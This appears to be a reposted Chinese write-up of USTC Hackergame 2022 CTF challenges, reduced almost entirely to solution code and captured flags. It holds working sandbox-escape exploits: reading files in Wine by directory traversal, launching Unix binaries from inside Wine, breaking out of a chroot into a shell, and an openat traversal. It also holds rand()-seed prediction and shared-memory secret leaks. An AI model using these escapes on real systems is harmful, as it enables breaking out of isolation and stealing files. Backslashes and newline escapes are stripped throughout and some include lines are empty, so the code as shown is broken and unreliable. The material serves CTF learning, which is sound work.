# 2022 USTC Hackergame WriteUp 0x02

> 原文: https://www.ctfiot.com/71319.html
> ID: 71319

推荐阅读：

2022蓝帽杯遇见的 SUID 提权 总结篇

CobaltStrike beacon二开指南

Edge浏览器-通过XSS获取高权限从而RCE

The End of AFR?

java免杀合集

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

阅读更多原创技术文章，戳“阅读全文”


```
flag{it_works_like_magic_e2a53e77e7}
self.info['scrambled'] and self.info['pc'] == self.info['lb'] and len(self.info['inbits']) > 0 and self.info['ib'] < 0
async def handle_input_on_change(self, message):
        try:
            inbits = list(map(int, message.sender.value))
            for x in inbits:
                assert x == 0 or x == 1
            assert len(inbits) == self.bitlength
            self.inbits = inbits
            if self.pc == 0:
                self.watch_pc(0)
            else:
                self.pc = 0
        
except:
            pass
def watch_pc(self, index):
        self.board.reset()
        for branch in self.branches[:
index]:
            self.board.move(branch[1] if self.inbits[branch[0]] else branch[2])
        for i in range(16):
            self.blocks[i].set_i(self.board.b[i//4][i % 4])
        self.info.set_info({'bT': self.branches[index][1] if index < len(self.branches) else '',
                            'bF': self.branches[index][2] if index < len(self.branches) else '',
                            'inbits': self.inbits,
                            'ib': self.branches[index][0] if index < len(self.branches) else -1,
                            'scrambled': bool(self.board),
                            'pc': index,
                            'lb': len(self.branches),
                            'hl': -1})
    async def action_reset(self):
        self.pc = 0

    async def action_last(self):
        self.pc = len(self.branches)

    async def action_prev(self):
        if self.pc > 0:
            self.pc -= 1

    async def action_next(self):
        if self.pc < len(self.branches):
            self.pc += 1
class Board:
    def __init__(self):
        self.b = [[i*4+j for j in range(4)] for i in range(4)]

    def _blkpos(self):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] == 15:
                    return (i, j)

    def reset(self):
        for i in range(4):
            for j in range(4):
                self.b[i][j] = i*4 + j

    def move(self, moves):
        for m in moves:
            i, j = self._blkpos()
            if m == 'L':
                self.b[i][j] = self.b[i][j-1]
                self.b[i][j-1] = 15
            elif m == 'R':
                self.b[i][j] = self.b[i][j+1]
                self.b[i][j+1] = 15
            elif m == 'U':
                self.b[i][j] = self.b[i-1][j]
                self.b[i-1][j] = 15
            else:
                self.b[i][j] = self.b[i+1][j]
                self.b[i+1][j] = 15

    def __bool__(self):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] != i*4 + j:
                    return True
        return False
# 前面先把源码 cp 一份
bitlength = 16
with open('chals/b16_obf.json') as f:
    # with open('chals/b4.json') as f:
    branches = json.load(f)

bp_app = BPApp(bitlength=bitlength, branches=branches)
# bp_app.run()
for i in range(0b1111111111111111):
    # for i in range(0b1111, 0, -1):
    msg = bin(i)[2:].rjust(16, '0')
    # msg = bin(i)[2:].rjust(4, '0')
    print(f"[+] -> {msg}")
    inbits = list(map(int, msg))
    bp_app.inbits = inbits

    bp_app.board.reset()
    for branch in bp_app.branches[:
len(bp_app.branches)]:
        bp_app.board.move(branch[1] if bp_app.inbits[branch[0]] else branch[2])
    result = bool(bp_app.board)
    if result:
        print(f"[!] ===================================> {msg}")
        print(bp_app.board.b)
        break
flag{Branching_Programs_are_NC1_98bbe61f17}
flag{easy_to_use_bindiff_7a230a956b}
    #include <stdio.h>
int main()
{
    FILE *fp= NULL;
    char buff[1000000];

    fp = fopen("./data/static.out", "r");
    fscanf(fp, "%s", buff);
    printf("%sn", buff);

    fscanf(fp, "%s", buff);
    printf("%s", buff);
    fclose(fp);

    return 0;
}
flag{the_compiler_is_my_eyes_7e7daa9a37}
def check_excutable(path, input, ans, timeout):
    if not os.path.isfile(path):
        return 'CE'

    try:
        p = subprocess.run(
            ["su", "runner", "-c", path],
            input=input,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout
        )
    
except subprocess.TimeoutExpired:
        return 'TLE'

    if p.returncode != 0:
        return 'RE'

    try:
        output = p.stdout.decode()
    
except UnicodeDecodeError:
        return 'WA'

    lines = output.strip().split('n')
    return 'AC' if lines == ans else 'WA'
const char * vogon_poem = R"V0G0N(
             O freddled gruntbuggly thy micturations are to me
                 As plured gabbleblochits on a lurgid bee.
              Groop, I implore thee my foonting turlingdromes.   
           And hooptiously drangle me with crinkly bindlewurdles,
Or I will rend thee in the gobberwarts with my blurlecruncheon, see if I don't.

                (by Prostetnic Vogon Jeltz; see p. 56/57)
)V0G0N";
const char * vogon_poem = R"( ... )";
    #define STRINGIFY(...) #__VA_ARGS__
    #define STR(...) STRINGIFY(__VA_ARGS__)
// #define STR(x) #x

const char* dynamic0_in = 
    #include "../data/dynamic0.in"
;
$ objcopy --input binary 
          --output elf32-i386 
          --binary-architecture i386 data.txt data.o

////////////////////////////
    #include <stdio.h>

/* here "data" comes from the filename data.o */
extern "C" char _binary_data_txt_start;
extern "C" char _binary_data_txt_end;

main()
{
    char*  p = &_binary_data_txt_start;

    while ( p != &_binary_data_txt_end ) putchar(*p++);
}
$ cat t1.c
__attribute__((section("some_array"))) int a[] = {1, 2, 3};
$ cat t2.c
__attribute__((section("some_array"))) int b[] = {4, 5, 6};
$ cat t.c
    #include <stdio.h>

extern const int __start_some_array;
extern const int __stop_some_array;

int main() {
  const int* ptr = &__start_some_array;
  const int n = &__stop_some_array - ptr;
  for (int i = 0; i < n; i++) {
    printf("some_array[%d] = %dn", i, ptr[i]);
  }
  return 0;
}
$ gcc -std=c99 -o t t.c t1.c t2.c && ./t
some_array[0] = 1
some_array[1] = 2
some_array[2] = 3
some_array[3] = 4
some_array[4] = 5
some_array[5] = 6
    #include 

    #define EMBED_STR(name, path)                
  extern const char name[];                  
  asm(".section .rodata, "a", @progbitsn" 
      #name ":n"                            
      ".incbin "" path ""n"               
      ".byte 0n"                            
      ".previousn");

EMBED_STR(kCurSourceFile, "example.cpp");

int main() {
  std::
cout << kCurSourceFile;
  return 0;
}
    #include <stdio.h>
    #include <string.h>
    #include <sys/stat.h>
    #include <stdlib.h>

    #define EMBED_STR(name, path)                              
    extern const char name[];                              
    asm(".section .rodata, "a", @progbitsn" #name ":n" 
        ".incbin "" path ""n"                           
        ".byte 0n"                                        
        ".previousn");

EMBED_STR(dynamic0_out, "./data/dynamic0.out");
EMBED_STR(dynamic1_out, "./data/dynamic1.out");
EMBED_STR(dynamic2_out, "./data/dynamic2.out");
EMBED_STR(dynamic3_out, "./data/dynamic3.out");
EMBED_STR(dynamic4_out, "./data/dynamic4.out");

int main()
{
    FILE *fp, *fp2 = NULL;
    char buff[200];
    char num[20];
    char filename[50];
    int no = 0;

    struct stat statbuf;
    fp = fopen("./temp/cnt", "a+");
    // fp = fopen("./cnt", "a+");
    if (fp == NULL)
    {
        puts("Fail to open file cnt!");
        exit(-1);
    }
    // stat("./temp/cnt", &statbuf);
    // stat("./cnt", &statbuf);
    // int size = statbuf.st_size;
    // if (size > 0)
    fscanf(fp, "%s", num);
    no = strlen(num);
    if (no == 1)
    {
        printf("%s", dynamic0_out);
    }
    else if (no == 2)
    {
        printf("%s", dynamic1_out);
    }
    else if (no == 3)
    {
        printf("%s", dynamic2_out);
    }
    else if (no == 4)
    {
        printf("%s", dynamic3_out);
    }
    else if (no == 5)
    {
        printf("%s", dynamic4_out);
    }
    else
    {
        strcpy(filename, "./data/static.out");
        // strcpy(filename, "./static.out");

        fp2 = fopen(filename, "r");
        if (fp2 == NULL)
        {
            // puts("Fail to open file out!");
            exit(0);
        }
        fscanf(fp2, "%s", buff);
        printf("%sn", buff);
        fscanf(fp2, "%s", buff);
        printf("%s", buff);
        fclose(fp2);
    }
    fprintf(fp, ".");
    fclose(fp);
    return 0;
}
Error: unknown pseudo-op: `.previous'
flag{cpp_need_P1040_std_embed_...}
    #define _CRT_SECURE_NO_WARNINGS

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <Windows.h>

// Recursive是1表示递归查找，否则就只列出本级目录
int ListDirectory(char* Path, int Recursive)
{
    HANDLE hFind;
    WIN32_FIND_DATA FindFileData;
    char FileName[MAX_PATH] = { 0 };
    int Ret = -1;

    strcpy(FileName, Path);
    strcat(FileName, "\");
    strcat(FileName, "*.*");

    // 查找第一个文件
    hFind = FindFirstFile(FileName, &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        printf("Error when list %sn", Path);
        return Ret;
    }
    do
    {
        // 构造文件名
        strcpy(FileName, Path);
        strcat(FileName, "\");
        strcat(FileName, FindFileData.cFileName);
        printf("%sn", FileName);

        // 如果是递归查找，并且文件名不是.和..，并且文件是一个目录，那么执行递归操作
        if (Recursive != 0 
            && strcmp(FindFileData.cFileName, ".") != 0
            && strcmp(FindFileData.cFileName, "..") != 0
            && FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            ListDirectory(FileName, Recursive);
        }
        // 查找下一个文件
        if (FindNextFile(hFind, &FindFileData) == FALSE)
        {
            // ERROR_NO_MORE_FILES 表示已经全部查找完成
            if (GetLastError() != ERROR_NO_MORE_FILES)
            {
                printf("Error when get next file in %sn", Path);
            }
            else
            {
                Ret = 0;
            }
            break;
        }
    } while (TRUE);

    // 关闭句柄
    FindClose(hFind);
    return Ret;
}

int main()
{
    char Path[MAX_PATH + 1] = { 0 };

    // 因为gets在VS2019里不可用，所以用fgets替代
    // fgets(Path, sizeof(Path), stdin);  
    strcpy(Path, "..\");
    // 因为使用了fgets，所以要取掉结尾多余的换行符
    while (Path[strlen(Path) - 1] == 'n'
           || Path[strlen(Path) - 1] == 'r')
    {
        Path[strlen(Path) - 1] = ' ';
    }
    ListDirectory(Path, 0);
    return 0;
}
..\.
..\..
..\.dockerenv
..\bin
..\boot
..\etc
..\flag1
..\flag2
..\home
..\lib
..\lib64
..\media
..\mnt
..\opt
..\readflag
..\root
..\run
..\sbin
..\server.py
..\srv
..\tmp
..\usr
..\var
    #include <windows.h>
    #include <stdio.h>
    #include <stdlib.h>

int main() {
    printf("Hello, world!n");
    char szOldPath[512] = { 0 };
    GetCurrentDirectoryA(512, szOldPath);
    printf("%sn", szOldPath);

    FILE *fp = NULL;
    char buff[1000000];
    fp = fopen("..\flag1", "r");
    fscanf(fp, "%s", buff);
    printf("%sn", buff);
    fclose(fp);

    printf("2333");
    return 0;
}
gcc exp1.c -o exp1
flag{Surprise_you_can_directory_traversal_1n_WINE_bb5da913e0}
wine: Unhandled page fault on read access to 0000000000000050 at address 000000007BC52BA7 (thread 0009), starting debugger...
0009:
err:
seh:
start_debugger Couldn't start debugger L"winedbg --auto 8 44" (2)
Read the Wine Developers Guide on how to set up winedbg or another debugger
import subprocess
import base64

if __name__ == "__main__":
    binary = input("Base64 of binary: ")
    with open("/dev/shm/a.exe", "wb") as f:
        f.write(base64.b64decode(binary))
    # check if it is a PE binary
    with open("/dev/shm/a.exe", "rb") as f:
        if f.read(2) != b"MZ":
            print("Not a valid PE binary.")
            exit(1)
    output = subprocess.run(
        ["su", "nobody", "-s", "/bin/bash", "-c" "/usr/bin/wine /dev/shm/a.exe"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env={
            "WINEPREFIX": "/wine"
        }
    )
    stdout = output.stdout[:
8192].decode()
    stderr = output.stderr.decode()
    print("stdout (标准输出，前 8192 个字节):")
    print(stdout)
    print("stderr (标准错误，前 8192 个字节):")
    stderr = stderr.split("n")

    stderr_blacklist = [
        "it looks like wine32 is missing",
        "multiarch needs to be",
        "dpkg --add-architecture",
        "install wine32",
        "wineserver:",
        r'Failed to create directory L"C:\users\nobody',
    ]
    limit = 8192
    for i in stderr:
        flag = True
        for b in stderr_blacklist:
            if b in i:
                flag = False
                break
        if flag:
            i_bytes = i.encode()
            if len(i_bytes) <= limit:
                print(i)
                limit -= len(i_bytes)
            else:
                i = i_bytes[:
limit].decode()
                print(i)
                exit(0)
    #include <windows.h>
    #include <stdio.h>
    #include <tchar.h>

void _tmain( int argc, TCHAR *argv[] )
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // if( argc != 2 )
    // {
    //     printf("Usage: %s [cmdline]n", argv[0]);
    //     return;
    // }
    printf("meow~n");

    // Start the child process. 
    if( !CreateProcessA( NULL,   // No module name (use command line)
        "\\.\unix\readflag",    //argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).n", GetLastError() );
        return;
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}
    #include 

int main() {
    execve("\\?\unix\readflag", NULL, NULL);
    return 0;
}
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    #include <string.h>

double rand01()
{
    return (double)rand() / RAND_MAX;
}

int main()
{
    // disable buffering
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    srand((unsigned)time(0) + clock());
    int games = 5;
    int win = 0;
    int lose = 0;
    char target[20];
    char guess[2000];
    for (int i = games; i > 0; i--) {
        int M = 0;
        int N = 400000;
        for (int j = 0; j < N; j++) {
            double x = rand01();
            double y = rand01();
            if (x*x + y*y < 1) M++;
        }
        double pi = (double)M / N * 4;
        sprintf(target, "%1.5f", pi);
        printf("请输入你的猜测（如 3.14159，输入后回车）：");
        fgets(guess, 2000, stdin);
        guess[7] = ' ';
        if (strcmp(target, guess) == 0) {
            win++;
            printf("猜对了！n");
        } else {
            lose++;
            printf("猜错了！n");
            printf("正确答案是：%1.5fn", pi);
        }
        if (win >= 3 || lose >= 3) break;
    }
    if (win >= 3) {
        printf("胜利！n");
        system("cat /flag");
    }
    else printf("胜败乃兵家常事，大侠请重新来过吧！n");
    return 0;
}
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    #include <string.h>

double rand01()
{
    return (double)rand() / RAND_MAX;
}

int main(int argc, char **argv)
{
    // disable buffering
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    int init = (unsigned)time(0);
    for (int offset = 0; offset <= 100000; offset++)
    {
        srand(init + offset);
        // srand(1666738405);
        printf("%d: ", init + offset);
        int games = 2; //5
        int win = 0;
        int lose = 0;
        char target[20];
        char guess[2000];
        for (int i = games; i > 0; i--) {
            int M = 0;
            int N = 400000;
            for (int j = 0; j < N; j++) {
                double x = rand01();
                double y = rand01();
                if (x*x + y*y < 1) M++;
            }
            double pi = (double)M / N * 4;
            printf("%1.5f, ", pi);
        }
        printf("n");
    }
    return 0;
}
FROM debian:11
RUN apt update && apt -y upgrade && 
    apt install -y gcc && rm -rf /var/lib/apt/lists/*
COPY monte_carlo.c /
RUN gcc -O3 /monte_carlo.c -o /a.out
CMD ["/a.out"]
docker build -t monte_carlo .
docker run --rm monte_carlo > data
flag{raNd0m_nUmb34_a1wayS_m4tters_7a5614bb46}
200474-200736 SPI: MOSI data: 66
200752-201015 SPI: MOSI data: 6C
201031-201293 SPI: MOSI data: 61
201309-201572 SPI: MOSI data: 67
201588-201850 SPI: MOSI data: 7B
201866-202129 SPI: MOSI data: 30
202145-202407 SPI: MOSI data: 4B
202423-202686 SPI: MOSI data: 5F
202702-202963 SPI: MOSI data: 79
202980-203243 SPI: MOSI data: 6F
203259-203520 SPI: MOSI data: 75
203537-203800 SPI: MOSI data: 5F
203816-204077 SPI: MOSI data: 67
204095-204357 SPI: MOSI data: 6F
204373-204634 SPI: MOSI data: 54
204652-204914 SPI: MOSI data: 5F
204930-205193 SPI: MOSI data: 74
205209-205471 SPI: MOSI data: 68
205487-205750 SPI: MOSI data: 33
205766-206028 SPI: MOSI data: 5F
206044-206307 SPI: MOSI data: 62
206323-206585 SPI: MOSI data: 34
206601-206864 SPI: MOSI data: 73
206880-207141 SPI: MOSI data: 49
207158-207421 SPI: MOSI data: 63
207437-207698 SPI: MOSI data: 5F
207716-207978 SPI: MOSI data: 31
207994-208255 SPI: MOSI data: 64
208273-208535 SPI: MOSI data: 45
208551-208814 SPI: MOSI data: 34
208830-209092 SPI: MOSI data: 5F
209108-209371 SPI: MOSI data: 63
209387-209649 SPI: MOSI data: 61
209665-209928 SPI: MOSI data: 52
209944-210206 SPI: MOSI data: 52
210222-210485 SPI: MOSI data: 79
210501-210763 SPI: MOSI data: 5F
210779-211042 SPI: MOSI data: 30
211058-211319 SPI: MOSI data: 4E
211336-211599 SPI: MOSI data: 7D
211615-211876 SPI: MOSI data: B0
211894-212156 SPI: MOSI data: E5
flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}
    #include 
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <sys/shm.h>

    #ifndef _SHMDATA_H_HEADER
    #define _SHMDATA_H_HEADER

    #define TEXT_SZ 2048

struct shared_use_st
{
    int written; // 作为一个标志，非0：表示可读，0：表示可写
    char text[TEXT_SZ]; // 记录写入 和 读取 的文本
};

    #endif

int main(int argc, char **argv)
{
    void *shm = NULL;
    struct shared_use_st *shared = NULL;
    char buffer[BUFSIZ + 1]; // 用于保存输入的文本
    int shmid;

    FILE *fp = NULL;
    fp = fopen("/secret", "r");
    // fscanf(fp, "%s", buffer);

    // 创建共享内存
    shmid = shmget((key_t)1234, sizeof(struct shared_use_st), 0666|IPC_CREAT);
    if (shmid == -1)
    {
        fprintf(stderr, "shmget failedn");
        exit(EXIT_FAILURE);
    }

    // 将共享内存连接到当前的进程地址空间
    shm = shmat(shmid, (void *)0, 0);
    if (shm == (void *)-1)
    {
        fprintf(stderr, "shmat failedn");
        exit(EXIT_FAILURE);
    }

    printf("Memory attched at %Xn", (int)shm);

    // 设置共享内存
    shared = (struct shared_use_st *)shm;
    // while (1) // 向共享内存中写数据
    {
        // 数据还没有被读取，则等待数据被读取，不能向共享内存中写入文本
        // while (shared->written == 1)
        // {
        //     sleep(1);
        //     printf("Waiting...n");
        // }

        // 向共享内存中写入数据
        printf("Enter some text: ");
        // fgets(buffer, BUFSIZ, stdin);
        // strcpy(buffer, "miaohomoend");
        fscanf(fp, "%s", buffer);
        fclose(fp);
        strncpy(shared->text, buffer, TEXT_SZ);

        // 写完数据，设置written使共享内存段可读
        shared->written = 1;

        // 输入了end，退出循环（程序）
        // if (strncmp(buffer, "end", 3) == 0)
        // {
        //     break;
        // }
    }

    // 把共享内存从当前进程中分离
    if (shmdt(shm) == -1)
    {
        fprintf(stderr, "shmdt failedn");
        exit(EXIT_FAILURE);
    }

    sleep(2);
    exit(EXIT_SUCCESS);
}
    #include <stddef.h>
    #include <sys/shm.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include 
    #include <string.h>

    #ifndef _SHMDATA_H_HEADER
    #define _SHMDATA_H_HEADER

    #define TEXT_SZ 2048

struct shared_use_st
{
    int written; // 作为一个标志，非0：表示可读，0：表示可写
    char text[TEXT_SZ]; // 记录写入 和 读取 的文本
};

    #endif

int main(int argc, char **argv)
{
    void *shm = NULL;
    struct shared_use_st *shared; // 指向shm
    int shmid; // 共享内存标识符

    // 创建共享内存
    shmid = shmget((key_t)1234, sizeof(struct shared_use_st), 0666|IPC_CREAT);
    if (shmid == -1)
    {
        fprintf(stderr, "shmat failedn");
        exit(EXIT_FAILURE);
    }

    // 将共享内存连接到当前进程的地址空间
    shm = shmat(shmid, 0, 0);
    if (shm == (void *)-1)
    {
        fprintf(stderr, "shmat failedn");
        exit(EXIT_FAILURE);
    }

    // printf("nMemory attached at %Xn", (int)shm);

    // 设置共享内存
    shared = (struct shared_use_st*)shm; // 注意：shm有点类似通过 malloc() 获取到的内存，所以这里需要做个 类型强制转换
    shared->written = 0;
    // while (1) // 读取共享内存中的数据
    {
        sleep(1);
        // 没有进程向内存写数据，有数据可读取
        // if (shared->written == 1)
        if (1)
        {
            printf("%s", shared->text);

            // 读取完数据，设置written使共享内存段可写
            shared->written = 0;

            // 输入了 end，退出循环（程序）
            // if (strncmp(shared->text, "end", 3) == 0)
            // {
            //     break;
            // }
        }
        // else // 有其他进程在写数据，不能读取数据
        // {
        //     sleep(1);
        // }
    }

    // 把共享内存从当前进程中分离
    if (shmdt(shm) == -1)
    {
        fprintf(stderr, "shmdt failedn");
        exit(EXIT_FAILURE);
    }

    // 删除共享内存
    if (shmctl(shmid, IPC_RMID, 0) == -1)
    {
        fprintf(stderr, "shmctl(IPC_RMID) failedn");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}
gcc -o expAA expAA.c
gcc -o expBB expBB.c
flag{ChR00t_ISNOTFULL_1501AtiOn_4f5ca7cef7}
int main() {
 int dir_fd, x;
 setuid(0);
 mkdir(".42", 0755);
 dir_fd = open(".", O_RDONLY);
 chroot(".42");
 fchdir(dir_fd);
 close(dir_fd);
 for(x = 0; x < 1000; x++) chdir("..");
 chroot(".");
 return execl("/bin/sh", "-i", NULL);
 }
int main(){
 char buf[100]={};
 int fd1 = openat(3,"../../../../../flag",0);
 read(fd1,buf,100);
 write(1,buf,100);
 printf("[+] from servern");
 }
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1667794740.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667794740.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1667794741.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667794742.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667794743.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1667794743.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667794744.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667794746.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/10-1667794747.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1667794748.png)